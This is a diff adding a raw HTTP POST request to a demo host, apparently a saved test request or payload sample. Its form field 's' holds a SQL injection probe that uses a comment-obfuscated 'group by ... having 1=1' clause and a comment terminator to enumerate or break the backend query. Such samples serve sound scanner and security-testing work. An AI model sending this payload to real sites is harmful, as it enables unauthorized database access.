@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Connection: close
+
+s=1 /*x*/group by 5 having 1=1-- -
